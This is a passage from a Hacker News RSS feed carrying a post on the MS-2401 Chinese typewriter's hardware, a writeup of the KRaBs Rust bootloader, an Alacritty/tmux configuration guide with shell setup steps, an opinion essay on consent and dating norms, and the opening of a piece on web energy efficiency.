<p>When the machine was designed, there's also an expansion socket at <cite>0xE8000</cite>. However, the expansion socket was never used.</p>
<p>As the only display device is a 240x64 LCD, the VRAM is just 2KB in size mapped at <cite>0x80000</cite>.</p>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-memory-map.png"></p><p>MS-2401 is significantly more capable with a bigger LCD display, larger RAM, and larger Chinese font ROM. To conserve mask ROM space, all font data in the mask ROM was compressed.</p>
<p><img alt="Memory Map for MS-2401H" src="https://tifan.net/images/20200917-ms-2401h-memory-map.png"></p><p>You might wonder what does "V-RAM (CRT Áî®)" in MS-2401H/01C mean. MS-2401H/01C is the top of the line model in MS-2401 series featuring ability to attach an external monitor. The graphics chip is <cite>MGP TM6066A</cite>, a Hercules clone, with MDA output.</p>
</div>
<div id="system-devices">
<h2>System Devices</h2>
<p>We all know the 8088 is not a very capable machine. ALPS custom made a few ASICs to connect system devices such as printers, keyboards and LCD monitors to the system. That's also what makes it extremely hard to write an emulator -- without knowing exactly how the ASIC works, it's close to impossible to emulate all devices and peripherals. Even with the original designer's help, we still can't be quite sure what is the exact IO address for each device, let alone determining what each command would do.</p>
<p>But anyway, we do have an rough idea of what the system is doing.</p>
<div id="external-storage-device">
<h3>External Storage Device</h3>
<p>The first model, MS-2400, have an audio cassette connector running at 1200bps. Each cassette can hold around 500KB of data, or 250k Chinese characters.</p>
<p>In 1986, when 3 1/2 inch disk just came out, Mr Jizhi Wang chose to use the very new technology in MS-2401. This is a killer function at that time, because digital documents could be finally archived relatively cheaply. Of course you could always use a computer, but that's a big upfront investment.</p>
</div>
<div id="keyboard">
<h3>Keyboard</h3>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-keyboard.jpg"></p><p>It's not a ANSI keyboard. The design seems to be inspired by JIS keyboard, and was fully translated into Chinese -- you can't even find "Ctrl" on the keyboard, instead, you'll see "ÊéßÂà∂" (lit. control). This flattens learning curve for the typewriter, as it doesn't feel foreign to the users. Just like we say "it's all Chinese to me" -- the Chinese users would say "it's all English to me" -- because it really is!</p>
<p>One interesting fact to point out is instead of commonly seem Esc, Tab, Caps Lock, Shift, Ctrl arrangement on the left, the keyboard is actually Âçä/ÂÖ® (half width / full width), Tab, Ctrl, Shift, Â∏∏Áî®Â≠ó (frequently used characters). Of course, it's a Chinese typewriter, Caps Lock isn't that important after all.</p>
</div>
<div id="printer">
<h3>Printer</h3>
<p>It sees that the printer only accepts low level commands -- or shall we say, the printer itself does not have a controller. According to the reference manual, the printer head and motor are directly controlled by the ASIC. It also needs a few dedicated timers.</p>
</div>
<div id="asic-and-fdd-controller">
<h3>ASIC and FDD Controller</h3>
<p>In MS-2401H, there are 2 ASICs, each of them contains around 8000 gates. the model is uPD91260GD-5BD and uPD91261GD-5BB.</p>
<p>The floppy controller for MS-2401 MS-2401H is UPD72067GC.</p>
</div>
</div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>The MS series machines are classical examples of pushing the hardware to its limits. Most people would simply say it's impossible to use a 8088-equivalent to drive a Chinese typewriter, but the engineers did it. By abusing the system and designing chips around the 8088, they were even able to map memory larger than the actual address space of the machine! Hats off to the hardworking engineers both in Stone Company and ALPS Electric.</p>
<p>Another thing to point out is Stone Company wrote fabulous documentations. It's really pleasing to read, contains a lot of technical details, and in some occasions, it teaches you electrical engineering! It even contained the layout of the diagnostics program so that you can just disassemble them and add new functionalities should you need them.</p>
<p><img alt="manga illustration in technical document" src="https://tifan.net/images/20200917-stone-documentation-manga.png"></p><p>Plus, the manga illustration is pretty cute. Haven't seen them for a long long time.</p>
</div>


  </div><!-- /.entry-content -->
  

</section>
    <!-- /#contentinfo -->
    
    
  </div></div>]]>
            </description>
            <link>https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514269</guid>
            <pubDate>Fri, 18 Sep 2020 08:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an x86 bootloader in Rust that can launch vmlinux]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24514100">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://vmm.dev/en/rust/krabs.md | <a href="https://web.archive.org/web/*/https://vmm.dev/en/rust/krabs.md">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article id="contents">
<section>

<p>I've been developping an x86 bootloader in Rust that can use Linux boot protocol. In this article, I'd like to write about my motivation, features of this project, and issues. </p>
 
</section>
<section>
<h2>KRaBs - Kernel Reader and Booters</h2>
<p>KRaBs is a 4-stage chain loader for x86/x86_64 written in Rust.
<br>
 It can boot an ELF-formatted kernel placed on a FAT32 filesystem in the EFI System Partition. The ELF-formatted kernel is read from the filesystem and relocated, and then the kernel is booted. 
<br>
 It is all implemented in Rust. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/">GitHub - o8vm/krabs: An x86 bootloader written in Rust.</a> </p>
<p>It has the following features: </p>
<ol> <li> Currently, only legacy BIOS is supported.</li> <li> Both 64 bit and 32 bit system are supported.</li> <li> Both 64 bit long mode and 32 bit protected mode kernel are supported.</li> <li> GPT format partition table is supported.</li> <li> FAT32 file system support.</li> <li> The boot-time behavior can be controlled by CONFIG.TXT, which is placed on the FAT32 filesystem.</li> <li> Minimal x86/x86_64 Linux boot protocol is supported.</li> <li> kernel command line setting in CONFIG.TXT is supported.</li> <li> Some modules such as initramsfs/initrd are supported.</li> 10. The multi-boot specification is not supported. </ol> 
<p>An example of starting 64bit vmlinux with kernel command line and initrd is described in <a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/docs/linux-image-setup-64.md">this article</a>. </p>
<p>Just git clone the project and run a <code>cargo run</code> to experience after some preparation: </p>
<pre><code>
cargo run -- -we disk.img
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://vmm.dev/en/rust/gogWCnI37-demo3.gif"><img src="https://vmm.dev/en/rust/gogWCnI37-demo3.gif" alt="demo3.gif"></a></p>
</section>
<section>
<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> planktonü¶†  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
‚îú‚îÄ‚îÄ build.rs
‚îú‚îÄ‚îÄ Cargo.toml
‚îú‚îÄ‚îÄ rust-toolchain
‚îú‚îÄ‚îÄ src
‚îÇ   ‚îú‚îÄ‚îÄ bios
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ plankton
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ stage_1st
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ stage_2nd
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ stage_3rd
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ stage_4th
‚îÇ   ‚îú‚îÄ‚îÄ main.rs
‚îÇ   ‚îî‚îÄ‚îÄ uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>
<section>
<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol> 
</section>
<section>
<h2>Issues</h2>
</section>
<section>
<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>
<pre><code>
fn setup_page_tables() {
    use plankton::layout::PGTABLE_START;
    use plankton::mem::MemoryRegion;
    let mut pg_table = ‚Ä¶</code></pre></section></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vmm.dev/en/rust/krabs.md">https://vmm.dev/en/rust/krabs.md</a></em></p>]]>
            </description>
            <link>https://vmm.dev/en/rust/krabs.md</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514100</guid>
            <pubDate>Fri, 18 Sep 2020 07:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play console games on the web ‚Äì AirConsole]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514066">thread link</a>) | @morgam
<br/>
September 18, 2020 | http://aircn.sl/console | <a href="https://web.archive.org/web/*/http://aircn.sl/console">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://aircn.sl/console</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514066</guid>
            <pubDate>Fri, 18 Sep 2020 07:49:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alacritty ‚Äì Fastest OS X Terminal Emulator ‚Äì Terminal like tmux/alacritty config]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24513821">thread link</a>) | @bebrws
<br/>
September 18, 2020 | https://bradbarrows.com/post/alacritty | <a href="https://web.archive.org/web/*/https://bradbarrows.com/post/alacritty">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><img src="https://bradbarrows.com/static/alacritty.png" alt="Alacritty - Fastest OSX Terminal?"><div><h2>Introducing Alacritty</h2><p>Alacritty is most likely the fastest GPU accelerated terminal emulator for OSX.</p><p>The only reason I hadn't tried it or used it very much before was the learning curve 
of a new terminal emulator and it's lack of tabs.</p><p>Luckily I was able to figure out how to make a great tmux and alacritty configuration 
file along with some nice bash functions to help with editing the configurations.</p><h2>Setting up Alacritty using my build</h2><p>First <a href="https://github.com/bebrws/alacritty/releases/download/0.6.0-dev-brads/Alacritty.zip">install Alacritty</a> from my repo to get a build that has an "Always On Top' action
I built in. The keyboard combo for this will "Command Shift A".</p><h2>Setting up Alacritty using my tmux and alacritty config</h2><p>Next clone my <a href="https://github.com/bebrws/myalacritty">configuration files</a></p><pre><code>git clone git@github.com:bebrws/myalacritty.git
cd myalacritty
cp tmux.conf ~/.tmux.conf
mkdir -p ~/.config/alacritty/
cp * ~/.config/alacritty/
wget http://bradbarrows.com/dls/jsin.zip
unzip jsin.zip
mv jsin /usr/local/bin/jsin</code></pre><h2>Bash/ZSH functions</h2><p>Add these functions to your .zshrc</p><pre><code>######### ALACRITTY GOOODNESS ############
alias -g alacrittycolors='python3 /Users/bbarrows/Library/Python/3.8//lib/python/site-packages/alacritty_colorscheme/cli.py '
# To use run: alaFontSize 12
function alaFontSize() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.font.size=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaOpacity 0.8
function alaOpacity() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.background_opacity=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaColorTheme
# Must run: sudo pip3 install alacrittycolors
# before using
# Also make sure jsin is installed from above or: https://github.com/bebrws/jsin
function alaColorTheme() {
   export ALABASE=$(python3 -m site | grep site | grep packages | head -n 1 | jsin "l.replace(/\s*\'/g, '').replace(/,/g, '')")
   python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/$(ls  ~/.config/alacritty/colors/ | fzf --preview "python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/{} &amp;&amp; htop")
}
function alaResetDark()  {
  cp ~/.config/alacritty/alacritty.yml.dark ~/.config/alacritty/alacritty.yml
}
function alaResetLight()  {
  cp ~/.config/alacritty/alacritty.yml.light  ~/.config/alacritty/alacritty.yml
}</code></pre><h2>Keyboard shortcuts</h2><ul><li>You should end up with tabs that you can click on just like Terminal.app and then can use the keyboard shortcuts "Shift-Left or Right arrow key".</li><li>"Control-b then c" - Create a new tab</li><li>"Control-b then f" - Create a horizonal window in the tab</li><li>"Control-b then v" - Create a veritical window in the tab</li><li>"Alt-Left or Right arrow key" - Move between split windows in the tab</li><li>"Command-Shift-A" - Keep Alacritty always on top</li><li>"Command-Shift-F" - Full screen</li><li>"Command-Shift-=/-" - Font size</li></ul><p>All the control and alt backspace and arrow key bindings should work out of the box!</p><p>You will end up with this beautiful terminal:</p><p><img alt="Alacritty in action" src="https://bradbarrows.com/static/alacritty.gif"></p></div></article></div></div></section></div>]]>
            </description>
            <link>https://bradbarrows.com/post/alacritty</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513821</guid>
            <pubDate>Fri, 18 Sep 2020 07:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Love Hurts: So let‚Äôs stop infantilizing women and demonizing men]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24513528">thread link</a>) | @jseliger
<br/>
September 17, 2020 | https://www.persuasion.community/p/love-hurts-511 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/love-hurts-511">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1378800,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>If you've ever read a Regency romance novel or watched a Jane Austen adaptation, you probably have a passing acquaintance with the trope of the <em>ruined woman</em>: that tragic victim of some caddish man who loved her, left her, and wrecked her societal resale value on his way out the door. In a world governed by a patriarchal system of marriage and inheritance, dependent on female purity to ensure any male offspring were legitimate, the ruined woman was literally damaged goods. Even the slightest whiff of a premarital dalliance could spell her undoing.</p><p>These old school ideas about women's worth have never entirely left us, resurfacing over the years in everything from the work of Andrea Dworkin to the abstinence wars of the late 1990s (when sex ed teachers would memorably compare girls who had sex before marriage to used pieces of Scotch tape). With dowries out of the picture, the idea that sex devalued women attached itself instead to America's sudden obsession with self-esteem. A young woman who had sex, particularly casual sex, clearly didn't respect herself. She was trying to fill an emotional void with cheap physical connection, and‚Äîyes‚Äîwas making herself unmarriageable. <em>He won‚Äôt buy the cow,</em> we were told, <em>if he can get the milk for free.</em></p><p>Today, the notion that sexual contact is degrading to women has become wrapped up in the contemporary progressive language of trauma and consent. The damage in question is emotional, not material, but the paternalistic message is the same: innocent women must be protected. </p><p><em>Consent is sexy</em>, we are told, as sex-education pamphlets primly instruct us in the essentials of mid-coital conversation.<em> Do you like it when I touch you there? What do you want me to do to you? </em>Never mind that said literature studiously ignores the fact that for the young, inexperienced people at whom such instructions are directed, dirty talk by administrative mandate just adds a whole new layer of pressure to an already awkward situation: For all its protestations about how <em>hot </em>consent can be, the progressive discourse surrounding sex is markedly unsexy. Amid the obsession with power, oppression and the ever present threat of harm, the notion of desire (or, heaven forbid, <em>fun</em>) all but disappears. Even the most pornographic consent-is-sexy script is about risk mitigation, not titillation, an insurance waiver with a side of heavy breathing. </p><p>This laser-focus on consent effectively recasts sex itself as a dangerous act, to be undertaken with extreme caution and only if absolutely necessary. And if relationships are mainly about power and the threat of abuse, those who pursue them too enthusiastically must be viewed with suspicion. More old-school gender stereotypes crop up here: men are increasingly seen as predators almost by default, while women are cast as helpless, even infantile. (Witness the rise of the word "grooming," previously reserved for sexual predation of children, as something done to women in their twenties.) As a breathtaking range of disappointing male behavior gets swept under the umbrella of MeToo, the line between pursuing a woman and preying on her has become blurred. When it was revealed that comic book writer Warren Ellis <a href="https://www.theguardian.com/books/2020/jul/13/women-speak-out-about-warren-ellis-transmetropolitan">had relationships with multiple women at once</a>, the litany of harms included no sexual misconduct at all; instead, the women were "[shocked] at the sheer magnitude of his pursuits ‚Ä¶ heartbroken when he stopped talking to them, or angry after discovering he was sending many of them identical messages." </p><p>Shock, heartbreak, anger: these are normal things to feel when a romantic relationship goes sour. But today, they're lumped into the nefarious category of abuse by virtue of the purported power someone like Ellis‚Äîolder, wealthier, more professionally successful, or otherwise more <em>privileged</em>‚Äîholds over his partners. By contrast, the notion that these were known and unavoidable risks of intimacy is dismissed as victim-blaming. As one of Ellis' accusers tweeted, "None of us consented to being manipulated." </p><p>This notion of consent as a safeguard against upsetting emotions is both new and counterintuitive: in most contexts (for instance, medical trials or media interviews), consent is sought precisely because what follows cannot be predicted, and may well be uncomfortable. But in certain progressive spaces, discomfort of any kind is taken to indicate the absence of consent, rendering countless normal human interactions suspicious. Turning someone down isn't comfortable, but neither is asking someone out. Even happy relationships involve moments of discomfort, disappointment, conflict‚Äîand even amicable breakups are rarely pain-free. Yet young people are now being taught to expect absolute emotional safety in sex, love and courtship at all times‚Äîand that if they feel hurt, disappointed or betrayed, it means they've been violated.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><div><p>So how did we get here? Social conservatives say that hookup culture is to blame, and they're not wrong: traditional courtship, monogamy and marriage have their downsides, but they do give relationships a certain amount of structure and security. In the age of Tinder, those safeguards are comparatively hard to come by‚Äîand the elaborate (and sometimes ridiculous) bureaucracy of consent regulations may be best understood as a desperate attempt to impose some order on this wild west of sex and intimacy, spearheaded by people who are terrified of being vulnerable or getting hurt. There's a sense that relationships could be made unfailingly safe and comfortable, that disappointment and awkwardness wouldn't exist, if we only had enough <em>rules</em>. </p><p> Relationships have always been risky endeavors, but, ironically, this hypervigilance has made them seem outright terrifying. Every new romance is treated like a scavenger hunt for "red flags" that forewarn abuse, and every breakup is subject to adjudication via the #MeToo framework. Unhappy exes hash out their grievances on social media in a way that used to be reserved for divorced celebrities wrangling for the sympathy of the press. Private affairs are dragged into the spotlight for public reckoning and reparations. Men, already saddled with the pressure of making the first move, have to calculate the additional risk that an awkward overture or misread signal will result not just in rejection, but public humiliation and ruination. For all its valuable contributions to combating sexual harassment in the workplace, #MeToo has also made dating itself at once more fraught and less appealing‚Äîfor everyone. If every relationship is a power struggle, in which the less privileged party is perpetually at risk of being victimized, why even bother? Who could possibly enjoy this? </p></div><p>This is not to demand a return to the rigid courtship norms of the Regency era‚Äînor to the blinkered sex-positivity of the early aughts. Instead, we need to reintroduce basic notions of female empowerment and individual agency, and push back against the facile understanding of complex interpersonal relationships as power struggles between oppressed and oppressor. We should teach both young men <em>and</em> young women to recognize each other's vulnerability and humanity‚Äîeven when a partner may hold more power than they do by certain measures‚Äîand to engage with their lovers as individuals, rather than as representatives of an identity group. And we should also teach young people to tolerate and work through discomfort, rather than seeing themselves as helplessly in thrall to power dynamics that leave them forever teetering on the precipice of victimhood. </p><p>When I wrote a teen advice column between 2009 and 2019, there was one question I received more often than any other: "How can I fall in love without getting hurt?" My answer was always the same: You can't! Intimacy requires vulnerability; the joy of human connection always comes with the risk of being hurt. But that risk is the same for everyone, no matter how privileged or blessed with institutional clout. Even the wealthiest, whitest, most cisheterosexual dudebro in the world can be absolutely wrecked by heartbreak‚Äîand even a person who sits at the intersectional nexus of multiple oppressed identity categories has the power to break someone's heart.</p><p>As much as trauma and abuse have replaced purity and marriageability on the landscape of moral panics, the same old fear is at work: that women's desires, left unchecked, will leave them in ruins. And while the impulse to protect young people from emotional pain may be well intentioned, the results are toxic. The obsessive focus on power as the driving mechanism in all relationships fuels a cycle of catastrophic thinking: women are ever more fearful of being mistreated, ever more convinced of their powerlessness to avoid it, and ever more sure that when it happens, they will be unable to handle it. And all the while, men, dehumanized by a framework that casts their desires as inherently predatory, are being taught to mistrust and infantilize women in the guise of respecting them.</p><p>We need to permanently banish the specter of the ruined woman from our understanding of heterosexual relationships. A healthy, sex-positive society acknowledges that unpredictability is a feature of dating, not a bug, and cannot be consent-scripted out of existence‚Äîparticularly for inexperienced people, and especially when it comes to casual sex. Young people must be taught to be kind with and conscientious to each other, to respect boundaries, and to err on the side of caution in ambiguous situations‚Äîbut they should also be taught that love and sex are rife with painful misunderstandings, and that even well-meaning people can hurt each other because they're insecure, confused or genuinely unsure about what they want. Instead of trying to keep them from ever feeling heartbreak, regret or shame, let's teach them that these things are always survivable, and sometimes even useful. Teach them to be gracious about rejection and charitable about missteps, knowing that they'll make mistakes ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/love-hurts-511">https://www.persuasion.community/p/love-hurts-511</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/love-hurts-511</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513528</guid>
            <pubDate>Fri, 18 Sep 2020 06:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we, as web professionals, help to make the web more energy efficient?]]>
            </title>
            <description>
<![CDATA[
Score 236 | Comments 384 (<a href="https://news.ycombinator.com/item?id=24513427">thread link</a>) | @giuliomagnifico
<br/>
September 17, 2020 | https://cmhb.de/web-design-and-carbon-impact | <a href="https://web.archive.org/web/*/https://cmhb.de/web-design-and-carbon-impact">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<section>
    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
